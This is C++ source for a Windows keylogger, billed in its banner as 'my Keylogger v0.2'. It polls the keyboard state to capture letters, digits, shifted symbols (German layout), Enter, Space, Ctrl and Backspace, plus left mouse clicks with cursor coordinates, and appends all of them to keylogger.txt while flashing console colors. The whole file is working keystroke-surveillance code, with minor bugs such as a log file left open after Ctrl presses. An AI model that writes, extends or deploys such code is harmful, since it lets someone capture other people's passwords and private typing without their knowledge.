#include <windows.h>
#include <iostream>
#include <fstream>
#include <thread>
using namespace std;

char buff;
void colors(){
    while(true){
    system("color 02");
    Sleep(100);
    system("color 03");
    Sleep(100);
    system("color 04");
    Sleep(100);
    system("color 05");
    Sleep(100);
    system("color 06");
    Sleep(100);
    system("color 07");
    Sleep(100);
    system("color 08");
    Sleep(100);
    system("color 0A");
    Sleep(100);
    system("color 0B");
    Sleep(100);
    system("color 0C");
    Sleep(100);
    system("color 0D");
    Sleep(100);
    system("color 0E");
    Sleep(100);
    system("color 0F");
    Sleep(100);
    }
}

HWND ActiveWindow;
bool getUppercase(){
if(GetAsyncKeyState(VK_SHIFT)){
    return true;
}
else{
    if((GetKeyState(VK_CAPITAL) & 0x0001)!=0){
        return true;
    }
    else{
        return false;
    }
}
}

int main()
{
    ActiveWindow = GetForegroundWindow();
    thread t1(colors);
    ofstream logfile("keylogger.txt");
    if(logfile.good()){
    logfile.close();
    cout << "***************************" << endl;
    cout << "**Welcome to my Keylogger**" << endl;
    cout << "***************************" << endl;
    cout << "****v 0.2 now with more****" << endl;
    cout << "*********Christmas*********" << endl;
    cout << "***************************" << endl;
    while(true)
        {
            for(int i = 0x30; i < 0x5B; i++){

                if(GetAsyncKeyState(i) && i != 30)
                {
                    if(!getUppercase() && i >= 0x41){
                       buff = static_cast<char>(i+32);
                    }
                    else{
                    if(getUppercase() && i <= 0x39){
                        cout << i << endl;
                        switch(i){
                    case 0x30:
                        buff = '=';
                        break;
                    case 0x31:
                        buff = '!';
                        break;
                    case 0x32:
                        buff = '"';
                        break;
                    case 0x33:
                        buff = '§';
                        break;
                    case 0x34:
                        buff = '$';
                        break;
                    case 0x35:
                        buff = '%';
                        break;
                    case 0x36:
                        buff = '&';
                        break;
                    case 0x37:
                        buff = '/';
                        break;
                    case 0x38:
                        buff = '(';
                        break;
                    case 0x39:
                        buff = ')';
                        break;
                        }
                    }
                    else{
                        buff = static_cast<char>(i);
                    }
                    }
                    logfile.open("keylogger.txt",ios::app);
                    logfile << buff;
                    cout << "Keystroke: "  << buff << " detected"<< endl;
                    logfile.close();
                    while(GetAsyncKeyState(i)){

                    }
                }
            }
            if(GetAsyncKeyState(VK_RETURN)){
                logfile.open("keylogger.txt",ios::app);
                logfile << "\n";
                cout << "Keystroke: \"Enter\" detected"<< endl;
                logfile.close();
                while(GetAsyncKeyState(VK_RETURN)){

                    }
            }
            if(GetAsyncKeyState(VK_SPACE)){
                logfile.open("keylogger.txt",ios::app);
                logfile << " ";
                cout << "Keystroke: \"Space\" detected"<< endl;
                logfile.close();
                while(GetAsyncKeyState(VK_SPACE)){

                    }
            }
            if(GetAsyncKeyState(VK_CONTROL)){
                logfile.open("keylogger.txt",ios::app);
                logfile << " CTRL ";
                cout << "Keystroke: \"Control\" detected"<< endl;
                while(GetAsyncKeyState(VK_CONTROL)){

                    }
            }

            if(GetAsyncKeyState(VK_BACK)){
                logfile.open("keylogger.txt",ios::app);
                logfile << "\b";
                cout << "Keystroke: \"Back\" detected"<< endl;
                logfile.close();
                while(GetAsyncKeyState(VK_BACK)){

                    }
            }
            if(GetAsyncKeyState(VK_LBUTTON)){
                POINT p;
                if(GetCursorPos(&p)){
                    logfile.open("keylogger.txt",ios::app);
                    logfile << "LMB at (" << p.x << "," << p.y << ")\n";
                    cout << "LMB at (" << p.x << "," << p.y << ")"<< endl;
                    logfile.close();
                }
                while(GetAsyncKeyState(VK_LBUTTON)){

                }
            }

        Sleep(1);
        }
    }
    else{
        cout << "Error" << endl;
        return 99;
    }

    return 0;
}
